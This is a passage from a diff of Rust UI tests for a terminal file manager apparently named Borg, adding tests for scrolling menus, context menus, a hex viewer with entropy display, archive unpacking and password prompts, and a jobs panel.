@@ -1,11 +1,11 @@
 use std::{
     env,
     path::PathBuf,
-    time::{Duration, SystemTime, UNIX_EPOCH},
+    time::{Duration, Instant, SystemTime, UNIX_EPOCH},
 };
 
 use anyhow::{Context, Result};
-use borg_core::{Motion, Msg, Preferences, Settings};
+use borg_core::{CaptureProgress, Keep, Motion, Msg, Preferences, Settings};
 use borg_term::GridSize;
 use borg_testkit::{Snapshot, Stage, describe};
 use borg_vfs::{Entry, EntryKind};
@@ -23,10 +23,16 @@ const RECENT: u64 = 1_768_037_400;
 const OLD: u64 = 1_717_200_000;
 const SIZE: GridSize = GridSize { cols: 90, rows: 22 };
 const NARROW: GridSize = GridSize { cols: 44, rows: 12 };
+const WIDE: GridSize = GridSize { cols: 150, rows: 12 };
 const ENV_SCREENSHOTS: &str = "BORG_SCREENSHOTS";
 const SCREENSHOT_DIR: &str = "ui";
 const HOME: &str = "/home/me";
 const QUIET: Preferences = Preferences::DEFAULT;
+/// For tests that reach a file by its place in the listing, which `.env` would move.
+const NO_HIDDEN: Preferences = Preferences { show_hidden: false, ..QUIET };
+const RELEASES: usize = 40;
+/// Alerts in a new log beside one Borg kept aside.
+const KEPT_ASIDE_ALERTS: usize = 2;
 
 fn at(secs: u64) -> Option<SystemTime> {
     Some(UNIX_EPOCH + Duration::from_secs(secs))
@@ -92,7 +98,11 @@ fn staged(motion: Motion, preferences: Preferences, left: Vec<Entry>, clock: &st
 }
 
 fn stage(size: GridSize, motion: Motion) -> Result<Stage> {
-    let settings = Settings { motion, preferences: QUIET, ..Settings::default() };
+    stage_with(size, motion, QUIET)
+}
+
+fn stage_with(size: GridSize, motion: Motion, preferences: Preferences) -> Result<Stage> {
+    let settings = Settings { motion, preferences, ..Settings::default() };
     let mut stage = Stage::new(
         [PathBuf::from("/home/me/projects/borg"), PathBuf::from("/var/log")],
         [project(), logs()],
@@ -181,6 +191,19 @@ fn command_menu_open() -> Result<()> {
 }
 
 #[test]
+fn command_menu_shows_where_freezing_stands() -> Result<()> {
+    let mut stage = stage(SIZE, Motion::STILL)?;
+    stage.state.settings.preferences.process_watch = true;
+    stage.state.settings.preferences.process_freeze = true;
+    stage.state.alerts.log.watch.stage = Some(borg_core::FreezeStage::Review);
+    let index = borg_core::menus(&stage.state).iter().position(|menu| menu.title == "Command").unwrap();
+    stage.send(Msg::Pointer(borg_core::Pointer::Menu(index)));
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "waits for review")?;
+    check("command_menu_freezing", &stage, buffer)
+}
+
+#[test]
 fn narrow_terminal_drops_columns() -> Result<()> {
     let mut stage = stage(NARROW, Motion::STILL)?;
     let buffer = stage.render(stage.started)?;
@@ -206,9 +229,78 @@ fn file_menu_open() -> Result<()> {
     check("file_menu", &stage, buffer)
 }
 
+/// The row of the screen that shows `needle`, and the column it starts at.
+fn place_of(buffer: &Buffer, needle: &str) -> Result<(u16, u16)> {
+    let text = describe(buffer);
+    let (row, line) = text.lines().enumerate().find(|(_, line)| line.contains(needle)).context("the text on screen")?;
+    let column = line[..line.find(needle).unwrap_or_default()].chars().count();
+    Ok((u16::try_from(row)?, u16::try_from(column)?))
+}
+
+fn click(column: u16, row: u16) -> crossterm::event::MouseEvent {
+    use crossterm::event::{MouseButton, MouseEvent, MouseEventKind};
+    MouseEvent { kind: MouseEventKind::Down(MouseButton::Left), column, row, modifiers: KeyModifiers::NONE }
+}
+
+/// Where the menu titled `title` is on the menu bar.
+fn menu_index(stage: &Stage, title: &str) -> Result<usize> {
+    borg_core::menus(&stage.state).iter().position(|menu| menu.title == title).context("the menu")
+}
+
+#[test]
+fn a_menu_taller_than_the_screen_scrolls_and_a_click_takes_the_entry_shown() -> Result<()> {
+    let mut stage = stage(SIZE, Motion::STILL)?;
+    stage.send(key(KeyCode::F(2))).send(key(KeyCode::End));
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "Quit")?;
+    ensure_no_text(&buffer, "  View ")?;
+    check("file_menu_scrolled", &stage, buffer.clone())?;
+    let (row, column) = place_of(&buffer, "Quit")?;
+    let quit = borg_core::menus(&stage.state)[menu_index(&stage, "File")?].entries.len() - 1;
+    let msg = borg_ui::mouse_input(&stage.state, click(column, row), false, stage.started);
+    anyhow::ensure!(matches!(msg, Some(Msg::Pointer(borg_core::Pointer::MenuItem(index))) if index == quit), "{msg:?}");
+    Ok(())
+}
+
+#[test]
+fn the_menu_bar_moves_to_show_a_menu_past_its_end_and_takes_clicks_where_its_titles_show() -> Result<()> {
+    let mut stage = stage(SIZE, Motion::STILL)?;
+    stage.send(key(KeyCode::F(9))).send(key(KeyCode::Left));
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "Encryption")?;
+    ensure_text(&buffer, "Create vault…")?;
+    check("encryption_menu", &stage, buffer.clone())?;
+    let (row, column) = place_of(&buffer, "Search")?;
+    let msg = borg_ui::mouse_input(&stage.state, click(column, row), false, stage.started);
+    let search = menu_index(&stage, "Search")?;
+    anyhow::ensure!(matches!(msg, Some(Msg::Pointer(borg_core::Pointer::Menu(index))) if index == search), "{msg:?}");
+    Ok(())
+}
+
+#[test]
+fn context_menu_opens_where_a_right_click_lands_and_a_click_chooses_an_entry() -> Result<()> {
+    use crossterm::event::{MouseButton, MouseEvent, MouseEventKind};
+    let mut stage = stage_with(SIZE, Motion::STILL, NO_HIDDEN)?;
+    let at = |kind, column, row| MouseEvent { kind, column, row, modifiers: KeyModifiers::NONE };
+    let right = at(MouseEventKind::Down(MouseButton::Right), 8, 6);
+    let msg = borg_ui::mouse_input(&stage.state, right, false, stage.started);
+    anyhow::ensure!(matches!(msg, Some(Msg::ContextMenu { .. })), "{msg:?}");
+    stage.send(msg.unwrap());
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "Copy folder path")?;
+    check("context_menu", &stage, buffer)?;
+    let copy_name = at(MouseEventKind::Down(MouseButton::Left), 12, 9);
+    let msg = borg_ui::mouse_input(&stage.state, copy_name, false, stage.started);
+    anyhow::ensure!(matches!(msg, Some(Msg::Pointer(borg_core::Pointer::MenuItem(1)))), "{msg:?}");
+    let outside = at(MouseEventKind::Down(MouseButton::Right), SIZE.cols - 2, 2);
+    let msg = borg_ui::mouse_input(&stage.state, outside, false, stage.started);
+    anyhow::ensure!(matches!(msg, Some(Msg::Pointer(borg_core::Pointer::DismissMenu))), "{msg:?}");
+    Ok(())
+}
+
 #[test]
 fn copy_and_delete_dialogs() -> Result<()> {
-    let mut stage = stage(SIZE, Motion::STILL)?;
+    let mut stage = stage_with(SIZE, Motion::STILL, NO_HIDDEN)?;
     stage.send(key(KeyCode::Down)).send(key(KeyCode::Down)).send(key(KeyCode::Down)).send(key(KeyCode::Down));
     stage.send(key(KeyCode::F(5)));
     let copy = stage.render(stage.started)?;
@@ -221,6 +313,31 @@ fn copy_and_delete_dialogs() -> Result<()> {
     stage.send(key(KeyCode::Esc)).send(key(KeyCode::F(8)));
     let delete = stage.render(stage.started)?;
     check("delete_dialog", &stage, delete)
+}
+
+#[test]
+fn delete_dialog_with_its_size_and_the_programs_using_the_files() -> Result<()> {
+    use borg_core::{DeleteFound, DeleteSize, FileHolder};
+    let mut stage = stage(SIZE, Motion::STILL)?;
+    stage.send(key(KeyCode::Down)).send(key(KeyCode::F(8)));
+    let Some(borg_core::Overlay::Confirm(borg_core::Confirm {
+        purpose: borg_core::ConfirmPurpose::Delete { check: Some(asked), .. },
+        ..
+    })) = &stage.state.overlay
+    else {
+        panic!("F8 on a folder here checks its files");
+    };
+    let id = asked.id;
+    let size = DeleteSize { bytes: 3_435_973_837, files: 41_200, complete: false };
+    let holders = ["postgres", "tail", "vim", "less", "rsync"]
+        .into_iter()
+        .zip(1..)
+        .map(|(name, pid)| FileHolder { pid: 800 + pid, name: name.into() })
+        .collect();
+    stage.send(Msg::DeleteChecked { id, found: DeleteFound::Size(size) });
+    stage.send(Msg::DeleteChecked { id, found: DeleteFound::Holders(Ok(holders)) });
+    let buffer = stage.render(stage.started)?;
+    check("delete_dialog_in_use", &stage, buffer)
 }
 
 #[test]
@@ -252,15 +369,13 @@ fn viewer_wraps_and_unwraps() -> Result<()> {
     check("viewer_unwrapped", &stage, unwrapped)
 }
 
-/// Sends `msg`, running a search the viewer asks for as the app does.
+/// Sends `msg`, running a search the viewer or the quick view asks for as the app does.
 fn send_and_search(stage: &mut Stage, msg: Msg) {
     for effect in borg_core::update(&mut stage.state, msg, stage.started) {
-        let borg_core::Effect::FindInViewer { id, query, from, direction, count } = effect else { continue };
-        let Some(borg_core::Content::Text(pager)) = stage.state.viewer.as_ref().map(|viewer| &viewer.content) else {
-            continue;
-        };
+        let borg_core::Effect::FindInPager { id, slot, query, from, direction, count } = effect else { continue };
+        let Some(pager) = stage.state.pager(slot) else { continue };
         let found = borg_core::find_in(&*pager.source(), &query, from, direction, count, &|_| true);
-        stage.send(Msg::FoundInViewer { id, found: found.map_err(|error| error.to_string()) });
+        stage.send(Msg::FoundInPager { id, slot, found: found.map_err(|error| error.to_string()) });
     }
 }
 
@@ -287,6 +402,128 @@ fn viewer_marks_matches_and_steps_through_them() -> Result<()> {
     let buffer = stage.render(stage.started)?;
     ensure_text(&buffer, "3 of 13 · n next · N previous")?;
     check("viewer_find_closed", &stage, buffer)
+}
+
+/// A small made-up binary: a header, zeros, a table of offsets and the text of its help.
+fn binary_sample() -> Vec<u8> {
+    let mut bytes = b"BORGIMG\0\x01\x02\x00\x00\x10\x00\x00\x00".to_vec();
+    bytes.extend([0; 40]);
+    bytes.extend((0..24u8).flat_map(|i| [i.wrapping_mul(37), 0x80 | i, 0, 0]));
+    bytes.extend(b"usage: tool [--verbose] <file>\n\tprints the image's header\n");
+    bytes.extend((0..=255u8).rev());
+    bytes
+}
+
+#[test]
+fn viewer_shows_hex_rows_that_fit_the_width_and_marks_matches_in_both_columns() -> Result<()> {
+    use std::sync::Arc;
+
+    for (size, name) in [(SIZE, "viewer_hex"), (NARROW, "viewer_hex_narrow"), (WIDE, "viewer_hex_wide")] {
+        let mut stage = stage(size, Motion::STILL)?;
+        let (width, height) = borg_core::viewer_size(stage.state.cols, stage.state.rows);
+        let pager = borg_view::Pager::new(Arc::new(binary_sample()), width, height)?;
+        opened(
+            &mut stage,
+            borg_core::Viewer::new(PathBuf::from("/opt/tool/image.bin"), borg_core::Content::Text(pager)),
+        );
+        stage.send(key(KeyCode::Char('h')));
+        let buffer = stage.render(stage.started)?;
+        ensure_text(&buffer, "0000  42 4f 52 47")?;
+        check(name, &stage, buffer)?;
+    }
+
+    let mut stage = stage(SIZE, Motion::STILL)?;
+    let (width, height) = borg_core::viewer_size(stage.state.cols, stage.state.rows);
+    let pager = borg_view::Pager::new(Arc::new(binary_sample()), width, height)?;
+    opened(&mut stage, borg_core::Viewer::new(PathBuf::from("/opt/tool/image.bin"), borg_core::Content::Text(pager)));
+    stage.send(key(KeyCode::Char('h'))).send(key(KeyCode::F(7)));
+    for msg in chars("verbose") {
+        send_and_search(&mut stage, msg);
+    }
+    send_and_search(&mut stage, key(KeyCode::Esc));
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "1 of 1 · n next · N previous")?;
+    check("viewer_hex_find", &stage, buffer)
+}
+
+/// Sends `msg`, reading the entropy the viewer asks for as the app does.
+fn send_and_profile(stage: &mut Stage, msg: Msg) {
+    for effect in borg_core::update(&mut stage.state, msg, stage.started) {
+        let borg_core::Effect::ProfileViewer { id } = effect else { continue };
+        let Some(borg_core::Content::Text(pager)) = stage.state.viewer.as_ref().map(|viewer| &viewer.content) else {
+            continue;
+        };
+        let profile = borg_view::entropy::Profile::read(&*pager.source(), &|| true).map_err(|e| e.to_string());
+        let profile = profile.and_then(|profile| profile.ok_or_else(|| "stopped".to_owned()));
+        stage.send(Msg::ViewerProfiled { id, profile });
+    }
+}
+
+/// A made-up packed program, a few 4 KiB blocks of each part: a header, code, zeros, a
+/// compressed payload and the text of its help.
+fn packed_sample() -> Vec<u8> {
+    let block = borg_view::entropy::BLOCK as usize;
+    let mut noise = 0x2545_f491_4f6c_dd1du64;
+    let mut random = move || {
+        noise ^= noise << 13;
+        noise ^= noise >> 7;
+        noise ^= noise << 17;
+        noise as u8
+    };
+    let opcodes: Vec<u8> = (0x40..0x58).collect();
+    let mut bytes = b"BORGPAK\0\x01\x02\x00\x00\x10\x00\x00\x00".to_vec();
+    bytes.resize(block, 0);
+    bytes.extend((0..4 * block).map(|_| opcodes[usize::from(random()) % opcodes.len()]));
+    bytes.extend(vec![0; 2 * block]);
+    bytes.extend((0..6 * block).map(|_| random()));
+    bytes.extend(b"usage: tool [--verbose] <file>\n".iter().cycle().take(3 * block));
+    bytes
+}
+
+#[test]
+fn viewer_hex_rows_show_the_files_entropy_beside_them() -> Result<()> {
+    use std::sync::Arc;
+
+    let mut stage = stage(SIZE, Motion::STILL)?;
+    let path = PathBuf::from("/opt/tool/tool.pak");
+    let (width, height) = borg_core::viewer_size(stage.state.cols, stage.state.rows);
+    let pager = borg_view::Pager::for_path(Arc::new(packed_sample()), &path, width, height)?;
+    stage.state.opening = Some(path.clone());
+    send_and_profile(&mut stage, Msg::Opened(borg_core::Viewer::new(path, borg_core::Content::Text(pager))));
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "hex · entropy 0.03, low")?;
+    check("viewer_hex_entropy", &stage, buffer)?;
+
+    send_and_profile(&mut stage, key(KeyCode::Char(']')));
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "7000  ")?;
+    ensure_text(&buffer, ", high")?;
+    check("viewer_hex_entropy_high", &stage, buffer)?;
+
+    let classic = stage.state.appearance.choices().iter().position(|c| c.id == "classic").unwrap();
+    stage.state.appearance.select(classic, stage.started, Duration::ZERO);
+    let buffer = stage.render(stage.started)?;
+    check("viewer_hex_entropy_classic", &stage, buffer)?;
+
+    let click = crossterm::event::MouseEvent {
+        kind: crossterm::event::MouseEventKind::Down(crossterm::event::MouseButton::Left),
+        column: SIZE.cols - 1,
+        row: SIZE.rows - 4,
+        modifiers: crossterm::event::KeyModifiers::NONE,
+    };
+    let msg = borg_ui::mouse_input(&stage.state, click, false, stage.started);
+    anyhow::ensure!(
+        matches!(msg, Some(Msg::Pointer(borg_core::Pointer::EntropyStrip { cell: 18, cells: 21 }))),
+        "{msg:?}"
+    );
+    stage.send(msg.unwrap());
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "db60  ")?;
+    for (cols, rows) in [(0, 0), (1, 1), (12, 6), (44, 14)] {
+        stage.send(Msg::Resize { cols, rows });
+        stage.render(stage.started)?;
+    }
+    Ok(())
 }
 
 #[test]
@@ -642,6 +879,39 @@ fn entering_a_folder_shows_the_new_listing_at_once() -> Result<()> {
     Ok(())
 }
 
+fn releases() -> Vec<Entry> {
+    (1..=RELEASES).map(|i| entry(&format!("release-{i:02}"), EntryKind::Dir, 4096, RECENT, false)).collect()
+}
+
+fn list_after(stage: &mut Stage, msg: Msg, entries: Vec<Entry>) -> Result<()> {
+    let effects = borg_core::update(&mut stage.state, msg, stage.started);
+    let Some(borg_core::Effect::List { side, generation, .. }) =
+        effects.into_iter().find(|effect| matches!(effect, borg_core::Effect::List { .. }))
+    else {
+        anyhow::bail!("the key must list a folder");
+    };
+    stage.send(Msg::Batch { side, generation, entries });
+    stage.send(Msg::Listed { side, generation, error: None });
+    Ok(())
+}
+
+#[test]
+fn leaving_a_folder_shows_the_parent_as_it_was_when_entered() -> Result<()> {
+    let mut stage = staged(Motion::STILL, QUIET, releases(), CLOCK)?;
+    for _ in 0..RELEASES * 3 / 4 {
+        stage.send(key(KeyCode::Down));
+    }
+    for _ in 0..RELEASES / 8 {
+        stage.send(key(KeyCode::Up));
+    }
+    let entered = describe(&stage.render(stage.started)?);
+    list_after(&mut stage, key(KeyCode::Enter), logs())?;
+    list_after(&mut stage, key(KeyCode::Enter), releases())?;
+    let buffer = stage.render(stage.started)?;
+    anyhow::ensure!(describe(&buffer) == entered, "the parent must look as it did:\n{entered}");
+    check("returned_to_parent", &stage, buffer)
+}
+
 #[test]
 fn menu_opens_immediately() -> Result<()> {
     let mut stage = stage(SIZE, Motion::LOCAL)?;
@@ -671,6 +941,12 @@ fn ensure_text(buffer: &Buffer, needle: &str) -> Result<()> {
     Ok(())
 }
 
+fn ensure_no_text(buffer: &Buffer, needle: &str) -> Result<()> {
+    let text = describe(buffer);
+    anyhow::ensure!(!text.contains(needle), "expected no {needle:?} in\n{text}");
+    Ok(())
+}
+
 #[test]
 fn dialogs_close_immediately() -> Result<()> {
     let mut stage = stage(SIZE, Motion::LOCAL)?;
@@ -696,7 +972,7 @@ fn sunset(width: u32, height: u32) -> Result<borg_gfx::Picture> {
 
 /// Shows `viewer` as if the file it holds had been asked for and loaded.
 fn opened(stage: &mut Stage, viewer: borg_core::Viewer) {
-    stage.state.opening = Some(viewer.path.clone());
+    stage.state.opening = viewer.path().map(PathBuf::from);
     stage.send(Msg::Opened(viewer));
 }
 
@@ -782,6 +1058,193 @@ fn graphics_enabled_panels_and_dialogs_use_only_terminal_cells() -> Result<()> {
     Ok(())
 }
 
+/// Long enough after the last keystroke for the password field to calm down.
+const PASSWORD_SETTLED: Duration = Duration::from_millis(1300);
+const ARCHIVE: &str = "/home/me/projects/borg/site.zip";
+const GIB: u64 = 1 << 30;
+const MIB: u64 = 1 << 20;
+
+fn archive_stage() -> Result<Stage> {
+    let left = vec![
+        entry("docs", EntryKind::Dir, 4096, OLD, false),
+        entry("site.zip", EntryKind::File, 42_000_000, RECENT, false),
+    ];
+    staged(Motion::STILL, QUIET, left, CLOCK)
+}
+
+/// Enter on the archive, and the listing it asks for.
+fn open_archive(stage: &mut Stage) -> Result<(borg_core::Side, u64)> {
+    stage.send(key(KeyCode::End));
+    let effects = borg_core::update(&mut stage.state, key(KeyCode::Enter), stage.started);
+    effects
+        .into_iter()
+        .find_map(|effect| match effect {
+            borg_core::Effect::List { side, generation, .. } => Some((side, generation)),
+            _ => None,
+        })
+        .context("Enter on an archive must list it")
+}
+
+fn archive_entries() -> Vec<Entry> {
+    let usage = borg_vfs::FolderUsage { files: 12, folders: 2, ..Default::default() };
+    vec![
+        Entry { usage: Some(usage), ..entry("docs", EntryKind::Dir, 1_480_000, OLD, false) },
+        entry("index.html", EntryKind::File, 18_400, RECENT, false),
+        entry("readme.md", EntryKind::File, 2_100, RECENT, false),
+    ]
+}
+
+#[test]
+fn an_archive_reads_opens_asks_for_its_password_and_warns_before_unpacking() -> Result<()> {
+    let mut stage = archive_stage()?;
+    let (side, generation) = open_archive(&mut stage)?;
+    stage.send(Msg::ArchiveReading { side, generation, read: 18_000_000, total: 42_000_000 });
+    let buffer = stage.render(stage.started + Duration::from_millis(800))?;
+    ensure_text(&buffer, "site.zip")?;
+    check("archive_reading", &stage, buffer)?;
+
+    let format = borg_archive::Format::Zip;
+    stage.send(Msg::ArchiveOpened { side, generation, format, left_out: 0 });
+    stage.send(Msg::Batch { side, generation, entries: archive_entries() });
+    stage.send(Msg::Listed { side, generation, error: None });
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "▤ zip")?;
+    ensure_text(&buffer, "readme.md")?;
+    check("archive_panel", &stage, buffer)?;
+
+    stage.send(key(KeyCode::End)).send(key(KeyCode::F(5)));
+    let effects = borg_core::update(&mut stage.state, key(KeyCode::Enter), stage.started);
+    let id = effects
+        .iter()
+        .find_map(|effect| match effect {
+            borg_core::Effect::StartUnpack { id, .. } => Some(*id),
+            _ => None,
+        })
+        .context("F5 in an archive must unpack")?;
+    let expand = borg_jobs::Ask::Expand {
+        archive: PathBuf::from(ARCHIVE),
+        packed: 42_000_000,
+        unpacked: 64 * GIB,
+        files: 250_000,
+    };
+    stage.send(Msg::Job { id, event: borg_jobs::Event::Asking(expand) });
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "Unpack anyway")?;
+    check("archive_expand", &stage, buffer)?;
+
+    stage.send(key(KeyCode::Char('u')));
+    let room = borg_jobs::Ask::Room { target: PathBuf::from("/var/log"), needed: 64 * GIB, free: 12 * GIB };
+    stage.send(Msg::Job { id, event: borg_jobs::Event::Asking(room) });
+    let buffer = stage.render(stage.started)?;
+    check("archive_room", &stage, buffer)?;
+
+    stage.send(key(KeyCode::Char('u')));
+    let slow = borg_jobs::Ask::Slow {
+        path: PathBuf::from(ARCHIVE),
+        file: true,
+        bytes: 64 * GIB,
+        estimate: Duration::from_secs(25 * 60),
+        kind: borg_drives::DriveKind::HardDrive,
+    };
+    stage.send(Msg::Job { id, event: borg_jobs::Event::Asking(slow) });
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "About 25 minutes for 64G on a hard drive.")?;
+    ensure_text(&buffer, "Always for this file")?;
+    check("archive_slow", &stage, buffer)?;
+
+    let (stage, buffer) = typed_password("hunter2")?;
+    anyhow::ensure!(!describe(&buffer).contains("hunter2"), "the password must stay hidden");
+    let (_, other) = typed_password("letmein")?;
+    anyhow::ensure!(other == buffer, "the noise must not depend on what was typed");
+    check("archive_password", &stage, buffer)
+}
+
+#[test]
+fn a_long_job_question_for_a_save_waits_behind_a_toast_then_shows_over_the_editor() -> Result<()> {
+    use borg_core::{EditorFile, EditorSlot, FileStamp, PackedFile};
+    let mut stage = archive_stage()?;
+    let (side, generation) = open_archive(&mut stage)?;
+    stage.send(Msg::ArchiveOpened { side, generation, format: borg_archive::Format::Zip, left_out: 0 });
+    stage.send(Msg::Batch { side, generation, entries: archive_entries() });
+    stage.send(Msg::Listed { side, generation, error: None });
+    stage.send(key(KeyCode::End)).send(key(KeyCode::F(4)));
+    let slot = EditorSlot::Screen;
+    let scratch = PathBuf::from("/run/borg/archive-view/edit-1/readme.md");
+    let text = "# Site\n\nRead me first.\n";
+    let stamp = FileStamp { len: text.len() as u64, modified: None, inode: 1 };
+    let shown = PathBuf::from(ARCHIVE).join("readme.md");
+    let packed = PackedFile { archive: PathBuf::from(ARCHIVE), password: None, entry: "readme.md".into(), shown };
+    let file = EditorFile { path: scratch, text: text.into(), stamp };
+    stage.send(Msg::ArchiveEditorOpened { slot, packed, result: Ok(file) });
+    stage.send(key(KeyCode::F(2)));
+    let effects = borg_core::update(&mut stage.state, Msg::EditorSaved(slot, Ok(stamp)), stage.started);
+    let id = effects
+        .iter()
+        .find_map(|effect| match effect {
+            borg_core::Effect::StartRewrite { id, .. } => Some(*id),
+            _ => None,
+        })
+        .context("a save in an archive must start a job")?;
+    let slow = borg_jobs::Ask::Slow {
+        path: PathBuf::from(ARCHIVE),
+        file: true,
+        bytes: 42_000_000,
+        estimate: Duration::from_secs(3 * 60),
+        kind: borg_drives::DriveKind::Network,
+    };
+    stage.send(Msg::Job { id, event: borg_jobs::Event::Asking(slow) });
+    let buffer = stage.render(stage.started)?;
+    ensure_no_text(&buffer, "Always for this file")?;
+    ensure_text(&buffer, "Save waits for you")?;
+    ensure_no_text(&buffer, "Alt-J")?;
+    check("archive_save_slow_toast_over_editor", &stage, buffer)?;
+    let rested = stage.started + Duration::from_secs(2);
+    borg_core::update(&mut stage.state, Msg::Tick, rested);
+    let buffer = stage.render(rested)?;
+    ensure_text(&buffer, "Read me first.")?;
+    ensure_text(&buffer, "Always for this file")?;
+    check("archive_save_slow_over_editor", &stage, buffer)
+}
+
+/// The password prompt after typing `password`, drawn once its flare has passed.
+fn typed_password(password: &str) -> Result<(Stage, Buffer)> {
+    let mut stage = archive_stage()?;
+    let (side, generation) = open_archive(&mut stage)?;
+    stage.send(Msg::ArchiveLocked { side, generation, wrong: true });
+    for msg in chars(password) {
+        stage.send(msg);
+    }
+    let buffer = stage.render(stage.started + PASSWORD_SETTLED)?;
+    Ok((stage, buffer))
+}
+
+#[test]
+fn leaving_a_folder_of_an_archive_that_went_away_returns_beside_it() -> Result<()> {
+    const GONE: &str = "No such file or directory (os error 2)";
+    let mut stage = archive_stage()?;
+    let (side, generation) = open_archive(&mut stage)?;
+    stage.send(Msg::ArchiveOpened { side, generation, format: borg_archive::Format::Zip, left_out: 0 });
+    stage.send(Msg::Batch { side, generation, entries: archive_entries() });
+    stage.send(Msg::Listed { side, generation, error: None });
+    stage.send(key(KeyCode::Home)).send(key(KeyCode::Down));
+    list_after(&mut stage, key(KeyCode::Enter), vec![entry("guide.md", EntryKind::File, 2_100, RECENT, false)])?;
+
+    let effects = borg_core::update(&mut stage.state, key(KeyCode::Left), stage.started);
+    let (side, generation) = effects
+        .into_iter()
+        .find_map(|effect| match effect {
+            borg_core::Effect::List { side, generation, .. } => Some((side, generation)),
+            _ => None,
+        })
+        .context("leaving the folder must list the archive's top")?;
+    let left = vec![entry("docs", EntryKind::Dir, 4096, OLD, false)];
+    list_after(&mut stage, Msg::Listed { side, generation, error: Some(GONE.into()) }, left)?;
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, GONE)?;
+    anyhow::ensure!(!describe(&buffer).contains("▤ zip"), "the panel must leave the archive");
+    check("archive_gone", &stage, buffer)
+}
+
 fn running_copy(stage: &mut Stage) -> Result<u64> {
     stage.send(key(KeyCode::Down)).send(key(KeyCode::Down)).send(key(KeyCode::Down)).send(key(KeyCode::Down));
     stage.send(key(KeyCode::F(5)));
@@ -798,7 +1261,7 @@ fn running_copy(stage: &mut Stage) -> Result<u64> {
 
 #[test]
 fn copy_job_progress_and_conflict() -> Result<()> {
-    let mut stage = stage(SIZE, Motion::STILL)?;
+    let mut stage = stage_with(SIZE, Motion::STILL, NO_HIDDEN)?;
     let id = running_copy(&mut stage)?;
     let later = stage.started + Duration::from_secs(20);
     let buffer = stage.render(later)?;
@@ -837,27 +1300,167 @@ fn copy_job_progress_and_conflict() -> Result<()> {
     stage.send(skip.unwrap());
     stage.send(Msg::Key(KeyEvent::new(KeyCode::Char('j'), KeyModifiers::ALT)));
     let buffer = stage.render(later)?;
-    ensure_text(&buffer, "p pause · c cancel")?;
+    ensure_text(&buffer, "Space Fold · P Pause · C Cancel")?;
     let shot = Snapshot::from_buffer(buffer.clone(), &stage.palette, None);
     let at = |text: &str| {
-        let (column, row) = shot.find(text).unwrap();
+        let (column, row) = shot.find(text).unwrap_or_else(|| panic!("{text:?} in\n{}", describe(&buffer)));
         borg_ui::mouse_input(&stage.state, crossterm::event::MouseEvent { column, row, ..click }, false, later)
     };
-    assert!(matches!(at("Copying"), Some(Msg::Pointer(borg_core::Pointer::DialogRow(0)))));
-    assert!(matches!(at("c cancel"), Some(Msg::Key(KeyEvent { code: KeyCode::Char('c'), .. }))));
+    assert!(
+        matches!(at("▾ Copy"), Some(Msg::Pointer(borg_core::Pointer::DialogRow(0)))),
+        "a job that asked stays unfolded"
+    );
+    assert!(matches!(at("C Cancel"), Some(Msg::Key(KeyEvent { code: KeyCode::Char('c'), .. }))));
+    let beside = crossterm::event::MouseEvent { column: 0, row: SIZE.rows - 1, ..click };
     assert!(
         matches!(
-            borg_ui::mouse_input(
-                &stage.state,
-                crossterm::event::MouseEvent { column: 0, row: 1, ..click },
-                false,
-                later
-            ),
+            borg_ui::mouse_input(&stage.state, beside, false, later),
             Some(Msg::Pointer(borg_core::Pointer::DismissDialog))
         ),
-        "a click beside the list closes it"
+        "a click beside the jobs panel closes it"
     );
     check("job_list", &stage, buffer)
+}
+
+/// A wide screen with a copy and a folder size count running, and a search that found three
+/// files and a move that failed.
+fn busy_jobs(stage: &mut Stage) -> Result<()> {
+    use borg_core::{ResultSource, SearchProgress, SearchRequest, Side};
+    let copy = running_copy(stage)?;
+    stage.send(key(KeyCode::Down));
+    stage.send(key(KeyCode::F(6)));
+    let effects = borg_core::update(&mut stage.state, key(KeyCode::Enter), stage.started);
+    let Some(borg_core::Effect::StartJob { id: moved, .. }) = effects.first().cloned() else {
+        anyhow::bail!("a move must start a job")
+    };
+    let failed = borg_jobs::Outcome::Failed("No space left on device".into());
+    stage.send(Msg::Job { id: moved, event: borg_jobs::Event::Finished(failed) });
+    stage.send(key(KeyCode::Tab));
+    stage.send(Msg::Key(KeyEvent::new(KeyCode::Char('i'), KeyModifiers::ALT)));
+    let sizes = stage.state.sizing.as_ref().map(|scan| scan.id).context("Alt-I counts sizes")?;
+    let progress = SearchProgress { visited: 41_230, ..Default::default() };
+    stage.send(Msg::SizeProgress { id: sizes, progress });
+    stage.send(key(KeyCode::Tab));
+    let request = SearchRequest {
+        typos: false,
+        skip: None,
+        root: "/home/me/projects".into(),
+        query: "*.log".into(),
+        hidden: false,
+        options: Default::default(),
+    };
+    stage.state.result_history[0] = Some(stage.state.panels[0].clone());
+    stage.state.panels[0].open_results(ResultSource::Search { request, progress: Default::default() }, Vec::new(), 70);
+    stage.state.panels[0].begin_search(70);
+    stage.send(Msg::Tick);
+    let found = ["build.log", "test.log", "deploy.log"].map(|name| {
+        let mut file = entry(name, EntryKind::File, 4_096, RECENT, false);
+        file.source = Some(PathBuf::from("/home/me/projects/borg").join(name));
+        file
+    });
+    stage.send(Msg::Batch { side: Side::Left, generation: 70, entries: found.to_vec() });
+    let progress = SearchProgress { visited: 9_812, ..Default::default() };
+    stage.send(Msg::SearchProgress { side: Side::Left, generation: 70, progress });
+    stage.send(Msg::Listed { side: Side::Left, generation: 70, error: None });
+    anyhow::ensure!(stage.state.jobs.iter().any(|job| job.id == copy && job.running()), "the copy still runs");
+    anyhow::ensure!(stage.state.jobs.len() == 4, "four jobs: {:?}", stage.state.jobs);
+    Ok(())
+}
+
+#[test]
+fn the_jobs_panel_folds_and_unfolds_every_kind_of_job() -> Result<()> {
+    let mut stage = stage_with(GridSize { cols: 120, rows: 30 }, Motion::STILL, NO_HIDDEN)?;
+    busy_jobs(&mut stage)?;
+    let later = stage.started + Duration::from_secs(20);
